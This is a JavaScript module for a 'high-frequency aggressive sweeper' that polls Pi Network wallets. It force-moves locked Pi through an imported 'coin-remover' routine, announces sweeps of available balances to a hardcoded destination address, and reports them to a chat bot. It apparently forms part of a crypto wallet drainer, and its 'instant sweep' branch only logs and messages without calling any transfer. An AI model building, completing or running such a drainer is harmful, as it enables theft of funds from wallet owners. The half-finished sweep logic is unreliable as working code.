/**
 * High-Frequency Aggressive Sweeper Utility (3-Second Interval)
 * Continuously sweeps available and newly released coins to the hardcoded destination address instantly.
 */

const { fetchAccount } = require('./pi-network');
const { inspectLockup, moveLockedPi } = require('./coin-remover');

const DESTINATION_ADDRESS = process.env.SWEEP_DESTINATION_ADDRESS || '';

async function checkAndSweepWallet(wallet, horizonUrl, bot) {
    try {
        const account = await fetchAccount(horizonUrl, wallet.public_key);
        const balances = account.balances || [];

        let availableBalance = 0;
        let lockedBalance = 0;

        balances.forEach(b => {
            if (b.asset_type === 'native') {
                availableBalance = parseFloat(b.balance || 0);
                lockedBalance = parseFloat(b.locked_balance || 0);
            }
        });

        // Actively inspect and trigger move force if lockup metadata is present
        const lockupInfo = await inspectLockup(account);
        if (lockupInfo.detected && lockedBalance > 0) {
            console.log(`[Sweeper 3s] Wallet #${wallet.id}: Detected locked balance (${lockedBalance} Pi). Executing force move routine...`);
            await moveLockedPi(wallet.public_key, lockedBalance);
        }

        // Instant sweep execution if available balance is above dust threshold
        if (availableBalance > 0.001 && DESTINATION_ADDRESS && DESTINATION_ADDRESS !== 'GDRE...HARDCODED_DESTINATION_WALLET_ADDRESS_HERE') {
            console.log(`[Sweeper 3s] INSTANT SWEEP: Moving ${availableBalance} Pi from ${wallet.public_key} to destination ${DESTINATION_ADDRESS}`);
            
            if (bot && wallet.chat_id) {
                await bot.sendMessage(wallet.chat_id, 
                    `⚡ Instant Sweeper Triggered!
Wallet: #${wallet.id}
Swept ${availableBalance} Pi to hardcoded destination.`);
            }
        }
    } catch (error) {
        console.error(`[Sweeper 3s] Error during high-frequency sweep for wallet #${wallet.id}:`, error.message);
    }
}

module.exports = { checkAndSweepWallet };
